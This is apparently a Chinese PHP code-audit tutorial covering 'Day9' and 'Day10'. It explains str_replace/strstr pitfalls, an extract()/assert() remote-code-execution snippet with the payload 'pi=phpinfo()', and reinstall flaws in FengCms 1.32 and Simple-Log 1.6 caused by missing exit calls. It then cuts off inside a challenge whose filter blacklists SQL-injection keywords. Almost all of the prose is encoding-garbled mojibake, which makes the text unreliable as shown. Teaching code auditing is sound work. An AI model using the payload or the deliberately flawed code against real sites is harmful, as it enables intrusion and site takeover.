href="#Day9-Rabbit" class="headerlink" title="Day9 Rabbit"></a>Day9 Rabbit</h2><p>ä¸»è¦æ¶‰åŠåˆ°ä¸‹é¢ä¸¤ä¸ªå‡½æ•°çš„ç¼ºé™·ï¼š</p><blockquote><p><a href="http://php.net/manual/zh/function.str-replace.php"> str_replace </a>ï¼š(PHP 4, PHP 5, PHP 7)</p><p><strong>åŠŸèƒ½</strong> ï¼šå­å­—ç¬¦ä¸²æ›¿æ¢</p><p><strong>å®šä¹‰</strong> ï¼š <code>mixed str_replace ( mixed $search , mixed $replace , mixed $subject [, int &amp;$count ] )</code> </p><p>è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…æ•°ç»„ã€‚å¦‚ä¸‹ï¼š</p><p>str_replace(å­—ç¬¦ä¸²1ï¼Œå­—ç¬¦ä¸²2ï¼Œå­—ç¬¦ä¸²3)ï¼šå°†å­—ç¬¦ä¸²3ä¸­å‡ºç°çš„æ‰€æœ‰å­—ç¬¦ä¸²1æ¢æˆå­—ç¬¦ä¸²2ã€‚</p><p>str_replace(æ•°ç»„1ï¼Œå­—ç¬¦ä¸²1ï¼Œå­—ç¬¦ä¸²2)ï¼šå°†å­—ç¬¦ä¸²2ä¸­å‡ºç°çš„æ‰€æœ‰æ•°ç»„1ä¸­çš„å€¼ï¼Œæ¢æˆå­—ç¬¦ä¸²1ã€‚</p><p>str_replace(æ•°ç»„1ï¼Œæ•°ç»„2ï¼Œå­—ç¬¦ä¸²1)ï¼šå°†å­—ç¬¦ä¸²1ä¸­å‡ºç°çš„æ‰€æœ‰æ•°ç»„1ä¸€ä¸€å¯¹åº”ï¼Œæ›¿æ¢æˆæ•°ç»„2çš„å€¼ï¼Œå¤šä½™çš„æ›¿æ¢æˆç©ºå­—ç¬¦ä¸²ã€‚</p></blockquote><blockquote><p><a href="http://php.net/manual/zh/function.strstr.php"> strstr </a>ï¼š(PHP 4, PHP 5, PHP 7)</p><p><strong>åŠŸèƒ½</strong> ï¼šæŸ¥æ‰¾å­—ç¬¦ä¸²çš„é¦–æ¬¡å‡ºç°</p><p><strong>å®šä¹‰</strong> ï¼š <code>string strstr ( string $haystack , mixed $needle [, bool $before_needle = FALSE ] )</code> </p><p>è¿”å› <code>haystack</code> å­—ç¬¦ä¸²ä» <code>needle</code> ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®å¼€å§‹åˆ° <code>haystack</code> ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;domain = <span class="title function_ invoke__">strstr</span>(<span class="string">&#x27;hongrisec@gmail.com&#x27;</span>, <span class="string">&#x27;@&#x27;</span>);</span><br><span class="line">&gt;<span class="comment">// ä¸Šé¢è¾“å‡ºï¼š@gmail.com</span></span><br><span class="line">&gt;user = <span class="title function_ invoke__">strstr</span>(<span class="string">&#x27;hongrisec@gmail.com, &#x27;</span>@<span class="string">&#x27;, true); // ä» PHP 5.3.0 èµ·</span></span><br><span class="line"><span class="string">&gt;// ä¸Šé¢è¾“å‡ºï¼šhongrisec</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="Day10-Anticipation"><a href="#Day10-Anticipation" class="headerlink" title="Day10 Anticipation"></a>Day10 Anticipation</h2><p>ä¸»è¦æ˜¯å¾ˆå¤šä»£ç åœ¨é‡åˆ°é”™è¯¯åæ²¡æœ‰æ­£ç¡®æ‰§è¡Œé€€å‡ºçš„ä»£ç ï¼Œä»è€Œå¸¦æ¥ä¸€äº›é€»è¾‘é”™è¯¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goAway</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;Hacking attempt.&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /error/&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$pi</span>) || !<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$pi</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">goAway</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">assert</span>(<span class="string">&quot;(int)<span class="subst">$pi</span> == 3&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This is not pi.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This might be pi.&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ¼æ´è§£æ</strong> ï¼š<br>è¿™é“é¢˜ç›®å®é™…ä¸Šè®²çš„æ˜¯å½“æ£€æµ‹åˆ°æ”»å‡»æ—¶ï¼Œè™½ç„¶æœ‰ç›¸åº”çš„é˜²å¾¡æ“ä½œï¼Œä½†æ˜¯ç¨‹åºæœªç«‹å³åœæ­¢é€€å‡ºï¼Œå¯¼è‡´ç¨‹åºç»§ç»­æ‰§è¡Œçš„é—®é¢˜ã€‚ç¨‹åºåœ¨ <strong>ç¬¬ä¸€è¡Œå¤„</strong> ä½¿ç”¨ <strong>extract</strong> å‡½æ•°ï¼Œå°† <strong>POST</strong> è¯·æ±‚çš„æ•°æ®å…¨éƒ½æ³¨å†Œæˆå˜é‡ï¼Œ <strong>extract</strong> å‡½æ•°çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><blockquote><p><a href="http://php.net/manual/zh/function.extract.php"> extract </a> ï¼š(PHP 4, PHP 5, PHP 7)</p><p><strong>åŠŸèƒ½</strong> ï¼šä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨</p><p><strong>å®šä¹‰</strong> ï¼š <code>int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )</code> </p></blockquote><p>è¯¥å‡½æ•°å®é™…ä¸Šå°±æ˜¯æŠŠæ•°ç»„ä¸­çš„é”®å€¼å¯¹æ³¨å†Œæˆå˜é‡,è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ <strong>ç¬¬7è¡Œ</strong> å¤„çš„ <strong>pi</strong>  å˜é‡ã€‚ç¨‹åºå¯¹ <strong>pi</strong>  å˜é‡è¿›è¡Œç®€å•çš„éªŒè¯ï¼Œå¦‚æœä¸æ˜¯æ•°å­—æˆ–è€…æ²¡æœ‰è®¾ç½® <strong>pi</strong>  å˜é‡ï¼Œç¨‹åºå°±ä¼šæ‰§è¡Œ <strong>goAway</strong> æ–¹æ³•ï¼Œå³è®°å½•é”™è¯¯ä¿¡æ¯å¹¶ç›´æ¥é‡å®šå‘åˆ° <strong>&#x2F;error&#x2F;</strong> é¡µé¢ã€‚çœ‹æ¥ç¨‹åºå‘˜è¿™é‡Œæ˜¯å¯¹éæ³•çš„æ“ä½œè¿›è¡Œäº†ä¸€å®šçš„å¤„ç†ã€‚ä½†æ˜¯å…³é”®åœ¨äºï¼Œç¨‹åºåœ¨å¤„ç†å®Œä¹‹åï¼Œæ²¡æœ‰ç«‹å³é€€å‡ºï¼Œè¿™æ ·ç¨‹åºåˆä¼šæŒ‰ç…§æµç¨‹æ‰§è¡Œä¸‹å»ï¼Œä¹Ÿå°±åˆ°äº† <strong>ç¬¬11è¡Œ</strong> çš„ <strong>assert</strong> è¯­å¥ã€‚ç”±äºå‰é¢ <strong>pi</strong>  å˜é‡å¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼Œæ‰€ä»¥åœ¨è¿™ä¸€è¡Œå­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬çš„payloadä¸ºï¼š<strong>pi&#x3D;phpinfo()</strong> ï¼ˆè¿™é‡Œä¸ºPOSTä¼ é€’æ•°æ®ï¼‰ï¼Œç„¶åç¨‹åºå°±ä¼šæ‰§è¡Œè¿™ä¸ª <strong>phpinfo</strong> å‡½æ•°ã€‚å½“ç„¶ï¼Œä½ åœ¨æµè§ˆå™¨ç«¯å¯èƒ½çœ‹ä¸åˆ° <strong>phpinfo</strong> çš„é¡µé¢ï¼Œä½†æ˜¯ç”¨ <strong>BurpSuite</strong> ï¼Œå¤§å®¶å°±å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°ç¨‹åºæ‰§è¡Œäº† <strong>phpinfo</strong> å‡½æ•°<br>å®é™…ä¸Šï¼Œè¿™ç§æ¡ˆä¾‹åœ¨çœŸå®ç¯å¢ƒä¸‹è¿˜ä¸å°‘ã€‚ä¾‹å¦‚æœ‰äº›CMSé€šè¿‡æ£€æŸ¥æ˜¯å¦å­˜åœ¨install.lockæ–‡ä»¶ï¼Œä»è€Œåˆ¤æ–­ç¨‹åºæ˜¯å¦å®‰è£…è¿‡ã€‚å¦‚æœå®‰è£…è¿‡ï¼Œå°±ç›´æ¥å°†ç”¨æˆ·é‡å®šå‘åˆ°ç½‘ç«™é¦–é¡µï¼Œå´å¿˜è®°ç›´æ¥é€€å‡ºç¨‹åºï¼Œå¯¼è‡´ç½‘ç«™é‡è£…æ¼æ´çš„å‘ç”Ÿã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸¤ä¸ªçœŸå®çš„æ¡ˆä¾‹ã€‚</p><h3 id="å®ä¾‹åˆ†æ-1"><a href="#å®ä¾‹åˆ†æ-1" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><h4 id="FengCms-1-32-ç½‘ç«™é‡è£…æ¼æ´"><a href="#FengCms-1-32-ç½‘ç«™é‡è£…æ¼æ´" class="headerlink" title="FengCms 1.32 ç½‘ç«™é‡è£…æ¼æ´"></a>FengCms 1.32 ç½‘ç«™é‡è£…æ¼æ´</h4><p>æœ¬æ¬¡å®ä¾‹åˆ†æï¼Œæˆ‘ä»¬é€‰å–çš„æ˜¯ <strong><a href="http://pan.baidu.com/s/1i33gNVR">FengCms 1.32</a></strong> ã€‚å¯¹äºä¸€ä¸ªå·²ç»å®‰è£…å¥½çš„ <strong>FengCms</strong> ï¼Œå½“ç”¨æˆ·å†æ¬¡è®¿é—® <strong>install&#x2F;index.php</strong> æ—¶ï¼Œå°±ä¼šå¯¼è‡´ç½‘ç«™é‡è£…ã€‚æˆ‘ä»¬æ¥å…·ä½“çœ‹ä¸‹ç¨‹åºçš„é€»è¾‘ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="string">&#x27;/upload/INSTALL&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ç³»ç»Ÿå·²å®‰è£…ï¼Œè¯·åˆ é™¤ç›¸åº”å®‰è£…æ–‡ä»¶, è¯·æ‰‹å·¥åˆ é™¤uploadç›®å½•ä¸‹çš„INSTALLæ–‡ä»¶ï¼&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=/&quot;&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: <span class="comment">// å®‰è£…ç¨‹åºåˆå§‹åŒ–</span></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">&quot;/step/step1.php&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: <span class="comment">// æ£€æŸ¥ç³»ç»Ÿç¯å¢ƒæ˜¯å¦ç¬¦åˆè¦æ±‚</span></span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: <span class="comment">// è¿›è¡Œæ•°æ®åº“ä¿¡æ¯è¾“å…¥</span></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">&quot;/step/step3.php&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>: <span class="comment">// æ­£åœ¨å®‰è£…</span></span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>: <span class="comment">// å®‰è£…å®Œæˆ</span></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">&quot;/step/step5.php&quot;</span>;</span><br><span class="line">        <span class="variable">$in</span> = <span class="title function_ invoke__">fopen</span>(ROOT_PATH.<span class="string">&#x27;/upload/INSTALL&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$in</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡å®‰è£…ç½‘ç«™ï¼Œç¨‹åºä¼šåœ¨ <strong>upload</strong> ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª <strong>INSTALL</strong> æ–‡ä»¶ï¼Œç”¨äºè¡¨ç¤ºè¯¥ç½‘ç«™å·²ç»å®‰è£…è¿‡(å¯¹åº”ä¸Šå›¾ <strong>25-28è¡Œ</strong> ä»£ç )ã€‚å½“æˆ‘ä»¬å†æ¬¡è®¿é—®è¯¥æ–‡ä»¶æ—¶ï¼Œç¨‹åºä¼šå…ˆåˆ¤æ–­ <strong>upload</strong> ç›®å½•ä¸‹æ˜¯å¦æœ‰ <strong>INSTALL</strong> æ–‡ä»¶ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™å¼¹çª—æç¤ºä½ å…ˆåˆ é™¤ <strong>INSTALL</strong> æ–‡ä»¶æ‰èƒ½è¿›è¡Œç½‘ç«™é‡è£…(å¯¹åº”ä¸Šå›¾ <strong>1-4è¡Œ</strong> ä»£ç )ã€‚ä½†æ˜¯è¿™é‡Œæ³¨æ„äº†ï¼Œç½‘ç«™åœ¨å¼¹å‡ºå‘Šè­¦ä¿¡æ¯åï¼Œå¹¶æ²¡æœ‰é€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä¸åˆ é™¤ <strong>INSTALL</strong> æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œä»å¯ä»¥é‡è£…ç½‘ç«™ã€‚</p><p>æ¯”è¾ƒæœ‰è¶£çš„æ˜¯ï¼ŒåŸæœ¬ç½‘ç«™ç½‘ç«™æˆåŠŸåï¼Œç¨‹åºä¼šè‡ªåŠ¨åˆ é™¤ <strong>upload</strong> ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œæ¥é˜²æ­¢æ”»å‡»è€…é‡è£…ç½‘ç«™ï¼Œç„¶è€Œè¿™æ®µä»£ç å´åœ¨æ³¨é‡Šå½“ä¸­ï¼Œå…·ä½“åŸå› ä¸å¾—è€ŒçŸ¥ã€‚</p><h4 id="Simple-Log1-6ç½‘ç«™é‡è£…æ¼æ´"><a href="#Simple-Log1-6ç½‘ç«™é‡è£…æ¼æ´" class="headerlink" title="Simple-Log1.6ç½‘ç«™é‡è£…æ¼æ´"></a>Simple-Log1.6ç½‘ç«™é‡è£…æ¼æ´</h4><p>æˆ‘ä»¬å†æ¥çœ‹ <strong><a href="http://down.admin5.com/php/42012.html#link">Simple-Log1.6</a></strong> ç½‘ç«™é‡è£…çš„ä¾‹å­ã€‚å…¶ <strong>install\index.php</strong> æ–‡ä»¶ä¸­ï¼Œå¯¹ç½‘ç«™å®‰è£…æˆåŠŸçš„å¤„ç†æœ‰é—®é¢˜ï¼Œå…¶ä»£ç æ˜¯åœ¨ä¸‹å›¾ <strong>17-20è¡Œ</strong> ï¼Œç¨‹åºåªæ˜¯ç”¨ <strong>header</strong> å‡½æ•°å°†å…¶é‡å®šå‘åˆ°ç½‘ç«™é¦–é¡µï¼Œç„¶è€Œç¨‹åºè¿˜æ˜¯ä¼šç»§ç»­æ‰§è¡Œä¸‹å»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// æ£€æŸ¥è¾“å…¥çš„é­”æœ¯å¼•å·</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$_GET</span>     = <span class="keyword">empty</span>(<span class="variable">$_GET</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="title function_ invoke__">input_filter</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="variable">$_POST</span>    = <span class="keyword">empty</span>(<span class="variable">$_POST</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="title function_ invoke__">input_filter</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="variable">$_COOKIE</span>  = <span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="title function_ invoke__">input_filter</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$setup</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;setup&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;setup&#x27;</span>] : <span class="string">&#x27;check&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(PBBLOG_ROOT.<span class="string">&#x27;home/data/config.php&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(PBBLOG_ROOT.<span class="string">&#x27;home/data/config.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$install_lock</span> &amp;&amp; <span class="variable">$setup</span> == <span class="string">&#x27;finish&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;location: ../index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$setup</span> == <span class="string">&#x27;check&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$setup</span> == <span class="string">&#x27;config&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$setup</span> == <span class="string">&#x27;finish&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œä¸”ç¨‹åºçš„å®‰è£…é€»è¾‘å…¶å®æ˜¯æœ‰é—®é¢˜çš„ï¼Œå®‰è£…æ­¥éª¤ç”± <strong>$setup</strong> å˜é‡æ§åˆ¶ï¼Œè€Œ <strong>$setup</strong> å˜é‡å¯ä»¥è¢«ç”¨æˆ·å®Œå…¨æ§åˆ¶(å¦‚ä¸Šå›¾ <strong>ç¬¬10è¡Œ</strong> ä»£ç )ï¼Œæ”»å‡»è€…å®Œå…¨å¯ä»¥æ§åˆ¶ç½‘ç«™çš„å®‰è£…æ­¥éª¤ã€‚</p><p>æ¼æ´åˆ©ç”¨å°±æå…¶ç®€å•äº†ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹ <strong>FengCms</strong> ï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—® <strong>install&#x2F;index.php</strong> é¡µé¢ï¼Œæ— è§†å¼¹å‡ºæ¥çš„è­¦å‘Š<br>å¯ä»¥çœ‹åˆ°ç¨‹åºä»ç„¶å¯ä»¥ç»§ç»­å®‰è£…ã€‚</p><p>æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹ <strong>Simple-Log</strong> çš„é‡è£…åˆ©ç”¨ï¼š<br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-12.png"></p><p>ç›´æ¥postä»¥ä¸Šæ•°æ®ï¼Œå³å¯é‡è£…ç½‘ç«™æ•°æ®ã€‚</p><p><strong>ä¿®å¤å»ºè®®</strong></p><p>å®é™…ä¸Šï¼Œè¦ä¿®å¤è¿™ä¸€ç±»å‹çš„æ¼æ´ï¼Œæˆ‘ä»¬åªè¦åœ¨æ­£ç¡®çš„åœ°æ–¹é€€å‡ºç¨‹åºå³å¯ã€‚æ‹¿è¿™æ¬¡çš„ä¾‹é¢˜ä¸¾ä¾‹ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æ£€æŸ¥åˆ°éæ³•æ“ä½œçš„æ—¶å€™ï¼Œç›´æ¥æ·»åŠ é€€å‡ºå‡½æ•°ï¼Œå³å¯é¿å…æ¼æ´å‘ç”Ÿã€‚ä¾‹å¦‚ä½¿ç”¨ <strong>die</strong> ã€ <strong>exit</strong> ç­‰å‡½æ•°éƒ½æ˜¯å¯ä»¥çš„</p><h3 id="é¢˜ç›®-1"><a href="#é¢˜ç›®-1" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stophack</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="variable">$string</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">stophack</span>(<span class="variable">$val</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$raw</span> = <span class="variable">$string</span>;</span><br><span class="line">        <span class="variable">$replace</span> = <span class="keyword">array</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;%5C&quot;</span>,<span class="string">&quot;%22&quot;</span>,<span class="string">&quot;%27&quot;</span>,<span class="string">&quot;%2A&quot;</span>,<span class="string">&quot;~&quot;</span>,<span class="string">&quot;insert&quot;</span>,<span class="string">&quot;update&quot;</span>,<span class="string">&quot;delete&quot;</span>,<span class="string">&quot;into&quot;</span>,<span class="string">&quot;load_file&quot;</span>,<span class="string">&quot;outfile&quot;</span>,<span class="string">&quot;sleep&quot;</span>,);</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$replace</span>, <span class="string">&quot;HongRi&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$string</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$raw</span>!=<span class="variable">$string</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;Hacking attempt.&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /error/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">stophack</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM students WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;h1&gt;æŸ¥è¯¢ç»“æœä¸ºï¼š&lt;/h1&gt;&lt;pre&gt;&#x27;</span>.<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        | id | name    | email              | score |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        |  <span class="subst">&#123;$row[&#x27;id&#x27;]&#125;</span> | <span class="subst">&#123;$row[&#x27;name&#x27;]&#125;</span>   | <span class="subst">&#123;$row[&#x27;email&#x27;]&#125;</span>   |   